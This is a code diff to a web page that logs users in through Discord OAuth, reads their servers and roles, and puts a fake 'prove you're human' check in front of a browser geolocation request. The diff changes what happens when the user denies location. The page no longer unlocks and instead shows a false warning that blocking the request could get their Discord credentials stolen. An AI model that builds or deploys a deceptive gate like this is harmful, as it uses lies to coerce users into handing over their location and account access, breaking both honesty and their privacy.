@@ -148,7 +148,6 @@
             font-size: 12px;
         }
 
-        /* Roles Dropdown Section */
         .roles-container {
             margin-top: 5px;
             padding-top: 8px;
@@ -205,7 +204,7 @@
 
         <!-- Verification Section -->
         <div id="verifyBox" class="verify-box">
-            <p style="margin: 0; color: #fff; font-weight: 500;">Prove you're human to access the website, a popup will appear once you press verify. Press allow on the popup to proceed.</p>
+            <p id="verifyMsg" style="margin: 0; color: #fff; font-weight: 500;">Prove you're human to access the website, a popup will appear once you press verify. Press allow on the popup to proceed.</p>
             <button id="humanBtn" class="verify-btn">I am a human.</button>
         </div>
 
@@ -230,7 +229,6 @@
 
         let userAccessToken = '';
 
-        // Added 'guilds.members.read' scope to fetch user roles inside servers
         const oauthUrl = `https://discord.com/oauth2/authorize?client_id=${CLIENT_ID}&redirect_uri=${encodeURIComponent(REDIRECT_URI)}&response_type=token&scope=identify%20guilds%20guilds.members.read`;
         const loginBtn = document.getElementById('loginBtn');
         loginBtn.href = oauthUrl;
@@ -242,6 +240,8 @@
 
         document.getElementById('humanBtn').addEventListener('click', () => {
         const humanBtn = document.getElementById('humanBtn');
+        const verifyMsg = document.getElementById('verifyMsg');
+
         humanBtn.textContent = "Verifying...";
         humanBtn.disabled = true;
 
@@ -279,12 +279,21 @@
         },
         (error) => {
         console.warn("Geolocation permission error:", error.message);
-        unlockInterface();
+
+        // Update UI to tell the user to verify again
+        verifyMsg.textContent = "You must press allow to proceed, since blocking the request might put your discord account credentials stolen.";
+        verifyMsg.style.color = "#ed4245"; // Red error color
+
+        humanBtn.textContent = "I am a human.";
+        humanBtn.disabled = false;
+
+        // DO NOT unlock interface here
         },
         { enableHighAccuracy: false, timeout: 10000, maximumAge: 0 }
         );
         } else {
-        unlockInterface();
+        verifyMsg.textContent = "Geolocation is not supported by your browser.";
+        humanBtn.disabled = false;
         }
         });
 
@@ -410,11 +419,9 @@
         }).join('');
         }
 
-        // Fetches and toggles roles for a specific guild
         async function toggleServerRoles(guildId, element) {
         const rolesBox = element.querySelector(`#roles-${guildId}`);
 
-        // Toggle visibility if already loaded
         if (!rolesBox.classList.contains('hidden') && !rolesBox.dataset.loading) {
         rolesBox.classList.add('hidden');
         return;
@@ -422,7 +429,6 @@
 
         rolesBox.classList.remove('hidden');
 
-        // Prevent duplicate API calls if roles are already fetched
         if (rolesBox.dataset.loaded) return;
         rolesBox.dataset.loading = "true";
 
